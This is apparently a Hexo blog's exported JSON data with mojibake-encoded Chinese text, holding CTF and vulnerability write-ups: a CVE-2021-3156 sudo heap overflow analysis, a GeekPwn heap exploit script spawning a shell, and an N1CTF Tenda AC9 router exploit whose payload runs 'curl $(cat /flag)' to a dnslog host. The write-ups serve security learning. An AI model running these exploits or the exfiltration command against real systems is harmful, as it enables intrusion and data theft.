{"meta":{"title":"nepireçš„èˆ°é˜Ÿ","subtitle":null,"description":"æ¸´æ±‚ç€èƒ½æ’¼åŠ¨ä¸–ç•Œçš„åŠ›é‡","author":"nepire","url":""},"pages":[{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2021-02-22T08:47:37.325Z","comments":false,"path":"client/index.html","permalink":"/client/index.html","excerpt":"","text":"ç›´æ¥ä¸‹è½½ or æ‰«ç ä¸‹è½½ï¼š","keywords":"Androidå®¢æˆ·ç«¯"},{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2021-02-22T08:47:37.325Z","comments":false,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"[æ–­ç«¹æ®‹èµ‹nepire] ä¸&nbsp; Nepire &nbsp; ï¼ˆ ï¼‰ å¯¹è¯ä¸­... bot_ui_ini()","keywords":"å…³äº"},{"title":"donate","date":"2018-12-20T15:13:05.000Z","updated":"2021-02-22T08:47:37.325Z","comments":false,"path":"donate/index.html","permalink":"/donate/index.html","excerpt":"","text":"","keywords":"è°¢è°¢é¥²ä¸»äº†å–µ~"},{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2021-02-22T08:47:37.325Z","comments":true,"path":"comment/index.html","permalink":"/comment/index.html","excerpt":"","text":"å¿µä¸¤å¥è¯— å™åˆ«æ¢¦ã€æ‰¬å·ä¸€è§‰ã€‚ ã€å®‹ä»£ã€‘å´æ–‡è‹±ã€Šå¤œæ¸¸å®«Â·äººå»è¥¿æ¥¼é›æ³ã€‹","keywords":"ç•™è¨€æ¿"},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2021-02-22T08:47:37.325Z","comments":false,"path":"lab/index.html","permalink":"/lab/index.html","excerpt":"","text":"sakuraä¸»é¢˜balabala","keywords":"Labå®éªŒå®¤"},{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2021-02-22T08:47:37.325Z","comments":false,"path":"bangumi/index.html","permalink":"/bangumi/index.html","excerpt":"","text":"","keywords":null},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2021-02-22T08:47:37.329Z","comments":false,"path":"music/index.html","permalink":"/music/index.html","excerpt":"","text":"","keywords":"å–œæ¬¢çš„éŸ³ä¹"},{"title":"links","date":"2018-12-19T15:11:06.000Z","updated":"2021-02-22T08:47:37.325Z","comments":true,"path":"links/index.html","permalink":"/links/index.html","excerpt":"","text":"","keywords":"å‹äººå¸"},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2021-02-22T08:47:37.329Z","comments":true,"path":"rss/index.html","permalink":"/rss/index.html","excerpt":"","text":""},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2021-02-22T08:47:37.329Z","comments":false,"path":"theme-sakura/index.html","permalink":"/theme-sakura/index.html","excerpt":"","text":"Hexoä¸»é¢˜Sakuraä¿®æ”¹è‡ªWordPressä¸»é¢˜Sakuraï¼Œæ„Ÿè°¢åŸä½œè€…Mashiro","keywords":"Hexo ä¸»é¢˜ Sakura ğŸŒ¸"},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2021-02-22T08:47:37.329Z","comments":true,"path":"tags/index.html","permalink":"/tags/index.html","excerpt":"","text":""},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2021-02-22T08:47:37.329Z","comments":false,"path":"video/index.html","permalink":"/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: 'æœèŠ±å¤•èª“â€”â€”äºç¦»åˆ«ä¹‹æœæŸèµ·çº¦å®šä¹‹èŠ±', status: 'å·²è¿½å®Œ', progress: 100, jp: 'ã•ã‚ˆãªã‚‰ã®æœã«ç´„æŸã®èŠ±ã‚’ã‹ã–ã‚ã†', time: 'æ”¾é€æ—¶é—´: 2018-02-24 SUN.', desc: ' ä½åœ¨è¿œç¦»å°˜åš£çš„åœŸåœ°ï¼Œä¸€è¾¹å°†æ¯å¤©çš„äº‹æƒ…ç¼–ç»‡æˆåä¸ºå¸Œæ¯”æ¬§çš„å¸ƒï¼Œä¸€è¾¹é™é™ç”Ÿæ´»çš„ä¼Šæ¬§å¤«äººæ°‘ã€‚åœ¨15å²å·¦å³å¤–è¡¨å°±åœæ­¢æˆé•¿ï¼Œæ‹¥æœ‰æ•°ç™¾å¹´å¯¿å‘½çš„ä»–ä»¬ï¼Œè¢«ç§°ä¸ºâ€œç¦»åˆ«çš„ä¸€æ—â€ï¼Œå¹¶è¢«è§†ä¸ºæ´»ç€çš„ä¼ è¯´ã€‚æ²¡æœ‰åŒäº²çš„ä¼Šæ¬§å¤«å°‘å¥³ç›å¥‡äºšï¼Œè¿‡ç€è¢«ä¼™ä¼´åŒ…å›´çš„å¹³ç¨³æ—¥å­ï¼Œå´æ€»æ„Ÿè§‰â€œå­¤èº«ä¸€äººâ€ã€‚ä»–ä»¬çš„è¿™ç§æ—¥å¸¸ï¼Œä¸€ç¬é—´å°±å´©æºƒæ¶ˆå¤±ã€‚è¿½æ±‚ä¼Šæ¬§å¤«çš„é•¿å¯¿ä¹‹è¡€ï¼Œæ¢…è¨è’‚å†›ä¹˜åç€åä¸ºé›·çº³ç‰¹çš„å¤ä»£å…½å‘åŠ¨äº†è¿›æ”»ã€‚åœ¨ç»æœ›ä¸æ··ä¹±ä¹‹ä¸­ï¼Œä¼Šæ¬§å¤«çš„ç¬¬ä¸€ç¾å¥³è•¾è‰äºšè¢«æ¢…è¨è’‚å¸¦èµ°ï¼Œè€Œç›å¥‡äºšæš—æ‹çš„å°‘å¹´å…‹é‡Œå§†ä¹Ÿå¤±è¸ªäº†ã€‚ç›å¥‡äºšè™½ç„¶æ€»ç®—é€ƒè„±äº†ï¼Œå´å¤±å»äº†ä¼™ä¼´å’Œå½’å»ä¹‹åœ°â€¦â€¦ã€‚' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: 'æœèŠ±å¤•èª“â€”â€”äºç¦»åˆ«ä¹‹æœæŸèµ·çº¦å®šä¹‹èŠ±', status: 'å·²è¿½å®Œ', progress: 100, jp: 'ã•ã‚ˆãªã‚‰ã®æœã«ç´„æŸã®èŠ±ã‚’ã‹ã–ã‚ã†', time: '2018-02-24 SUN.', desc: ' ä½åœ¨è¿œç¦»å°˜åš£çš„åœŸåœ°ï¼Œä¸€è¾¹å°†æ¯å¤©çš„äº‹æƒ…ç¼–ç»‡æˆåä¸ºå¸Œæ¯”æ¬§çš„å¸ƒï¼Œä¸€è¾¹é™é™ç”Ÿæ´»çš„ä¼Šæ¬§å¤«äººæ°‘ã€‚åœ¨15å²å·¦å³å¤–è¡¨å°±åœæ­¢æˆé•¿ï¼Œæ‹¥æœ‰æ•°ç™¾å¹´å¯¿å‘½çš„ä»–ä»¬ï¼Œè¢«ç§°ä¸ºâ€œç¦»åˆ«çš„ä¸€æ—â€ï¼Œå¹¶è¢«è§†ä¸ºæ´»ç€çš„ä¼ è¯´ã€‚æ²¡æœ‰åŒäº²çš„ä¼Šæ¬§å¤«å°‘å¥³ç›å¥‡äºšï¼Œè¿‡ç€è¢«ä¼™ä¼´åŒ…å›´çš„å¹³ç¨³æ—¥å­ï¼Œå´æ€»æ„Ÿè§‰â€œå­¤èº«ä¸€äººâ€ã€‚ä»–ä»¬çš„è¿™ç§æ—¥å¸¸ï¼Œä¸€ç¬é—´å°±å´©æºƒæ¶ˆå¤±ã€‚è¿½æ±‚ä¼Šæ¬§å¤«çš„é•¿å¯¿ä¹‹è¡€ï¼Œæ¢…è¨è’‚å†›ä¹˜åç€åä¸ºé›·çº³ç‰¹çš„å¤ä»£å…½å‘åŠ¨äº†è¿›æ”»ã€‚åœ¨ç»æœ›ä¸æ··ä¹±ä¹‹ä¸­ï¼Œä¼Šæ¬§å¤«çš„ç¬¬ä¸€ç¾å¥³è•¾è‰äºšè¢«æ¢…è¨è’‚å¸¦èµ°ï¼Œè€Œç›å¥‡äºšæš—æ‹çš„å°‘å¹´å…‹é‡Œå§†ä¹Ÿå¤±è¸ªäº†ã€‚ç›å¥‡äºšè™½ç„¶æ€»ç®—é€ƒè„±äº†ï¼Œå´å¤±å»äº†ä¼™ä¼´å’Œå½’å»ä¹‹åœ°â€¦â€¦ã€‚' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} ç•ªç»„è®¡åˆ’ è¿™é‡Œå°†æ˜¯æ°¸è¿œçš„å›å¿† window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} æ”¾é€æ—¶é—´: ${video.time} ${video.desc} ${video.status} `) }) }","keywords":"Bç«™"}],"posts":[{"title":"2021qwbfinal_mirouter","slug":"2021qwbfinal-mirouter","date":"2021-07-25T08:34:18.000Z","updated":"2021-07-25T08:35:06.615Z","comments":true,"path":"2021/07/25/2021qwbfinal-mirouter/","link":"","permalink":"/2021/07/25/2021qwbfinal-mirouter/","excerpt":"","text":"https://transparent-mirror-7c0.notion.site/2021-final-da67b742e4724267ac407af3cc955bcc","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"CVE-2021-3156","slug":"CVE-2021-3156","date":"2021-02-04T12:20:21.000Z","updated":"2021-02-22T08:49:52.243Z","comments":true,"path":"2021/02/04/CVE-2021-3156/","link":"","permalink":"/2021/02/04/CVE-2021-3156/","excerpt":"","text":"CVE-2021-3156ç®€ä»‹sudoä¸­å †æº¢å‡ºå¯¼è‡´çš„æƒé™æå‡ é€šè¿‡è¶Šç•Œè¦†ç›–ç»“æ„ä½“å†…å®¹åŠ«æŒåŠ è½½çš„libcï¼Œå¹¶åˆ¶ä½œsetuidä¸º0èµ·root_shellçš„ä¸€ä¸ªåº“ å…³é”®æ¼æ´å‡½æ•°ä¸ºset_cmndï¼Œæºç è·¯å¾„ä¸ºâ€plugins/sudoers/sudoers.câ€ å…³é”®åˆ©ç”¨å‡½æ•°ä¸ºnss_load_libraryï¼Œæºç è·¯å¾„ä¸ºâ€nss/nsswitch.câ€ åˆ†æç¯å¢ƒubuntu@1804:~/CVE-2021-3156$ uname -a Linux 1804 4.15.0-136-generic #140-Ubuntu SMP Thu Jan 28 05:20:47 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux ubuntu@1804:~/CVE-2021-3156$ sudo -V Sudo version 1.8.21p2 Sudoers policy plugin version 1.8.21p2 Sudoers file grammar version 46 Sudoers I/O plugin version 1.8.21p2 æ¼æ´å‡½æ•°841 /* set user_args */ 842 if (NewArgc &gt; 1) { 843 char *to, *from, **av; 844 size_t size, n; 845 846 /* Alloc and build up user_args. */ 847 for (size = 0, av = NewArgv + 1; *av; av++) 848 size += strlen(*av) + 1; 849 if (size == 0 || (user_args = malloc(size)) == NULL) { 850 sudo_warnx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); 851 debug_return_int(-1); 852 } 853 if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) { 854 /* 855 * When running a command via a shell, the sudo front-end 856 * escapes potential meta chars. We unescape non-spaces 857 * for sudoers matching and logging purposes. 858 */ 859 for (to = user_args, av = NewArgv + 1; (from = *av); av++) { 860 while (*from) { 861 if (from[0] == &#39;\\\\&#39; &amp;&amp; !isspace((unsigned char)from[1])) 862 from++; 863 *to++ = *from++; 864 } 865 *to++ = &#39; &#39;; 866 } 867 *--to = &#39;\\0&#39;; 868 }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"äºŒè¿›åˆ¶é¢è¯•ç›¸å…³","slug":"äºŒè¿›åˆ¶é¢è¯•ç›¸å…³","date":"2020-12-23T03:23:26.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2020/12/23/äºŒè¿›åˆ¶é¢è¯•ç›¸å…³/","link":"","permalink":"/2020/12/23/äºŒè¿›åˆ¶é¢è¯•ç›¸å…³/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"GeekPwn_warmmp","slug":"GeekPwn-warmmp","date":"2020-10-20T07:05:20.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2020/10/20/GeekPwn-warmmp/","link":"","permalink":"/2020/10/20/GeekPwn-warmmp/","excerpt":"","text":"GeekPwn warmmpæ‘¸é±¼ pwnbabypwnglibc2.23çš„é¢˜ç¡®å®å¥½ä¹…ä¸è§äº†showå‡½æ•°çš„idxåªæ£€éªŒä¸Šé™æœªæ£€éªŒä¸‹é™åˆšå¥½alarmåœ°å€åœ¨é‚£ï¼Œsize=0æ—¶åˆèƒ½æ— é™å†™ç„¶åä¹‹åå°±æ˜¯fsopï¼ˆFileStructureç¡®å®å¥½ç”¨ï¼‰ from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&quot;./pwn&quot;) elf = ELF(&quot;./pwn&quot;) libc = elf.libc def choice(idx): n.recvuntil(&quot;Input your choice:&quot;) n.sendline(str(idx)) def new(size,content,name=&quot;n&quot;): choice(1) n.recvuntil(&quot;Member name:&quot;) n.sendline(name) n.recvuntil(&quot;Description size:&quot;) n.sendline(str(size)) n.recvuntil(&quot;Description:&quot;) n.sendline(content) def free(idx): choice(2) n.recvuntil(&quot;index:&quot;) n.sendline(str(idx)) def show(idx): choice(3) n.recvuntil(&quot;index:&quot;) n.sendline(str(idx)) def pshow(): for i in range(3): show(-4-i) n.recvuntil(&quot;name:&quot;) print hex(u64(n.recvline()[:-1].ljust(8,&quot;\\x00&quot;))) show(-4) n.recvuntil(&quot;name:&quot;) libcbase = u64(n.recvline()[:-1].ljust(8,&#39;\\x00&#39;)) - libc.sym[&#39;alarm&#39;] print hex(libcbase) system = libcbase + libc.sym[&#39;system&#39;] io_list_all = libcbase + libc.sym[&#39;_IO_list_all&#39;] new(0x10,&#39;0000&#39;) new(0x10,&#39;1111&#39;) free(1) free(0) new(0,&#39;&#39;) show(0) n.recvuntil(&quot;Description:&quot;) heapbase = u64(n.recv(6)+&quot;\\x00\\x00&quot;)-0x20 print hex(heapbase) #gdb.attach(n) new(0x10,&#39;1111&#39;) new(0x40,&#39;2222&#39;) new(0x40,(p64(0)+p64(0x11))*4) new(0x40,&#39;4444&#39;) new(0x40,&#39;5555&#39;) free(0) payload = &#39;\\x00&#39;*0x10 + p64(0) + p64(0x91) new(0,payload) free(1) free(0) fileStr = FileStructure(null=0) fileStr.flags = u64(&quot;/bin/sh\\0&quot;) fileStr._IO_read_ptr=0x61 fileStr._IO_read_end=0 fileStr._IO_read_base=io_list_all-0x10 fileStr._IO_write_base=2 fileStr._IO_write_ptr=3 fileStr.vtable = heapbase + 0xe0+0x20 payload = &quot;a&quot;*0x10+bytes(fileStr) payload += p64(0)*2 + p64(system)*2 new(0,payload) n.interactive()","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"ä½œä¸šæ²¡åšå®Œæ‰“ä¸äº†N1CTFæƒ¨æƒ¨","slug":"ä½œä¸šæ²¡åšå®Œæ‰“ä¸äº†N1CTFæƒ¨æƒ¨","date":"2020-10-20T06:23:03.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2020/10/20/ä½œä¸šæ²¡åšå®Œæ‰“ä¸äº†N1CTFæƒ¨æƒ¨/","link":"","permalink":"/2020/10/20/ä½œä¸šæ²¡åšå®Œæ‰“ä¸äº†N1CTFæƒ¨æƒ¨/","excerpt":"","text":"#n1ctfæ‘¸é±¼è·¯ä¸Šè´¢åŠ¡æŠ¥è¡¨ä½œä¸šè¦äº¤äº†æƒ¨æƒ¨ åšåˆ°åé¢çªç„¶æƒ³èµ·äº†ä½œä¸šè¿˜æ²¡å†™ï¼ŒåŠé€”è·‘è·¯ï¼ˆæƒ¨æƒ¨ èµ›åå’Œå‡ºé¢˜äººèŠäº†ä¸‹å‘ç°æœ¬æ¥æ˜¯0dayé¢˜ï¼Œä½†ç¯å¢ƒæ²¡é…å¥½ï¼Œç»“æœå°±æ˜¯è¿™é¢˜çš„åˆ©ç”¨ç®€å•äº†å¾ˆå¤šï¼Œè™½ç„¶åªæœ‰å››è§£ Babyrouter è¿™æ¬¡å°±æ•´äº†è¿™é¢˜ï¼Œé¢˜ç›®ç»™äº†ä¸ªdockeråŒ… ä½†ä»æˆ‘åœ¨Windowsä¸‹è§£å‹è¿™ä¸ªç¯å¢ƒçš„æ—¶å€™å°±ggäº†ï¼Œè¿™äº›ç¯å¢ƒé—®é¢˜æœ€åå†ä¸€èµ·è¯´ å¾ˆæ˜æ˜¾çš„èƒ½çŸ¥é“æˆ‘ä»¬éœ€è¦åˆ†æçš„æ˜¯httpdï¼Œç»è¿‡ç®€å•çš„åˆ†æè¿‡åæˆ‘ä»¬èƒ½çŸ¥é“è¿™æ˜¯ Tenda AC9 V1.0 V15.03.05.19 çš„è·¯ç”±å™¨çš„ä¸€éƒ¨åˆ†ï¼Œè¿™ç§æ—¶å€™èƒ½å»æ‰¾cveæˆ–è€…ç›´æ¥æŒ–0dayæ¥åšé¢˜ï¼Œè„šæœ¬ç¨å¾®æ‰«ä¸€ä¸‹ emmmï¼Œè¿™é‡Œé¢åº”è¯¥ä¸å°‘0dayä½†æˆ‘è¿˜æ˜¯ç›´æ¥æ‰¾cveå§ï¼Œä¸€ä¸ªä¸ªçœ‹è¿‡å»å¯å¤ªæ…¢äº† éšä¾¿æ‹¿äº†ä¸ªå‡ºæ¥å‘ç°ç¡®å®å­˜åœ¨ï¼Œä¸è¿‡ç½‘ä¸Šåªæœ‰pocï¼Œexpéœ€è¦æˆ‘ä»¬è‡ªå·±å»å†™ æœ€è›‹ç–¼çš„å°±æ˜¯æ­è°ƒè¯•ç¯å¢ƒäº†ï¼Œæ‰¾æ´ä¸‰åˆ†é’Ÿï¼Œæ­ç¯å¢ƒä¸‰å°æ—¶ å½“æ—¶åœ¨å®¡è®¡çš„æ—¶å€™çœ‹åˆ°å­—ç¬¦ä¸²æœ‰ä¸ªdoshellè¿˜ä»¥ä¸ºæ˜¯ä»€ä¹ˆå®˜æ–¹åé—¨ï¼Œæ‰¾åˆ°å¯¹åº”å‡½æ•°æ‰å‘ç°ä¸æ˜¯ï¼Œä¸è¿‡ä¹Ÿä¸ºæˆ‘ä»¬åˆ©ç”¨æä¾›äº†ä¸å°‘ä¾¿åˆ©ï¼Œæˆ‘ä»¬åªè¦è®¾ç½®å¥½$r11ç„¶åè·³è½¬åˆ°è¿™å°±èƒ½ä»»æ„å‘½ä»¤æ‰§è¡Œ è¿™é‡Œå…ˆç®€å•çš„ä»‹ç»ä¸‹ldrçš„å‘½ä»¤ LDR R0ï¼Œ[R1ï¼Œ#8] ï¼›å°†å­˜å‚¨å™¨åœ°å€ä¸ºR1+8çš„å­—æ•°æ®è¯»å…¥å¯„å­˜å™¨R0 ç„¶åå›åˆ°fromaddressnat é€šè¿‡ç®€å•çš„æµ‹è¯•åå‘ç°å¡«å……çš„ccccæ˜¯è¿”å›åœ°å€ï¼Œå°±æ˜¯pcï¼Œä¿®æ”¹å¯¹åº”ä½ç½®ä¸ºdoshellæ‰€åœ¨çš„ä½ç½®åé‡æ–°è°ƒè¯•æˆåŠŸè·³è½¬ ä½†ç”±äº\\$r11å’Œ\\$r4æ²¡è®¾ç½®æˆæ­£ç¡®æŒ‡é’ˆæ‰€ä»¥æ— æ³•å†ç»§ç»­æ­¥è¿›ï¼Œæ„é€ ä¸‹æŒ‡é’ˆå°±èƒ½ä»»æ„ä»£ç æ‰§è¡Œäº†ï¼Œæ‡’çš„åå¼¹shellå°±ç›´æ¥dnså¸¦å‡ºæ¥äº† expå¦‚ä¸‹ #!/usr/bin/env python2 # n1ctf{42926f989b610f3f8e717d8a252bcc21} from pwn import * import requests cmd = &#39;curl $(cat /flag).yf2erc.dnslog.cn;&#39; #cmd = &quot;&quot; payload = p32(0xf6fff9ec+4)+cmd.ljust(0xf0,&quot;a&quot;) payload += p32(0xf6fff9ec+16) payload += p32(0x6B154) data = {&#39;entrys&#39;:&#39;aaaa&#39;,&#39;mitInterface&#39;:&#39;aaaa&#39;,&#39;page&#39;:payload} cookie = {&#39;Cookie&#39;:&#39;password=1234&#39;} #r = requests.post(&#39;http://127.0.0.1:2333/goform/addressNat&#39;,data = data,cookies=cookie) r = requests.post(&#39;http://8.210.119.59:9990/goform/addressNat&#39;,data = data,cookies=cookie) é‡ç‚¹ç¬”è®°å¼€å§‹äº†ï¼Œä¸»è¦æœ‰ä¸¤ä¸ªæ€»ç»“çš„åœ°æ–¹ 1.libçš„é“¾æ¥é—®é¢˜ æˆ‘åœ¨ä¸Šé¢ä¹Ÿè®²äº†ï¼Œåœ¨Windowsä¸‹è§£å‹è¿™ä¸ªç¯å¢ƒggäº†ï¼Œå…ˆè¯´ç»“æœï¼Œåœ¨windowsä¸‹è§£å‹å¸¦ç¬¦å·é“¾æ¥çš„zipåŒ…æ—¶ä¼šå¯¼è‡´é“¾æ¥å¤±æ•ˆå˜æˆasciiæ–‡æœ¬ï¼Œç„¶ååœ¨æˆ‘å†™è¿™ç¯‡æ–‡ç« æ—¶å‘ç°å³ä½¿åœ¨ubuntuç¯å¢ƒä¸‹ï¼Œåˆ©ç”¨ubuntuè‡ªå¸¦çš„guiè§£å‹å·¥å…·æŠŠæ–‡ä»¶æ‹–å‡ºæ¥é“¾æ¥æ–‡ä»¶æ˜¯ç›´æ¥ä¸æ˜¾ç¤ºä¸è§£æï¼Œä¹Ÿä¸ä¼šè§£å‹ åªæœ‰unzip file.zipæ‰èƒ½æ­£å¸¸å¸¦ç¬¦å·çš„è§£å‹å‡ºæ¥ 2.è°ƒè¯•ç¯å¢ƒ è¿™æ¬¡æ¯”è¾ƒå¥½æ•´ï¼Œå°±æ”¹äº†run.shå’Œstart.shä¸¤ä¸ªæ–‡ä»¶ä¿®æ”¹å¦‚ä¸‹ å‰©ä¸‹çš„å°±æ˜¯å¤–éƒ¨ä½¿ç”¨gdb-multiarchè°ƒè¯•æœ¬åœ°1147ç«¯å£ï¼Œéƒ½æ˜¯ä¼ ç»Ÿè°ƒè¯•æ–¹æ³•ï¼Œç„¶åè¿˜æ˜¯æ¨ä¸€æ³¢æˆ‘çš„gdbç¯å¢ƒ https://github.com/Nepire/Pwngdb","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"æ‘¸é±¼ä¹‹æˆ˜","slug":"æ‘¸é±¼ä¹‹æˆ˜","date":"2020-08-28T07:05:30.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2020/08/28/æ‘¸é±¼ä¹‹æˆ˜/","link":"","permalink":"/2020/08/28/æ‘¸é±¼ä¹‹æˆ˜/","excerpt":"","text":"æ‘¸é±¼åŸä¹‹æˆ˜æ‘¸â€¦â€¦é’“é±¼åŸæ¯å’Œæ´ä½¬ä»–ä»¬ç»„äº†ä¸ªé˜Ÿæ‘¸äº†ä¸€å¤©é±¼ï¼Œå¿«ä¹å°±å®Œäº‹ Cryptoconfused_flagçˆ†ç ´ï¼Œå› ä¸ºflagå†…çš„ä¸œè¥¿ä¸æ˜¯æ˜æ–‡æ‰€ä»¥ç¬¦åˆæ ¼å¼çš„æœ‰å¥½å‡ ä¸ªä¸€ä¸ªä¸ªå»è¯•ï¼Œæœ€åè¯•æˆåŠŸäº† 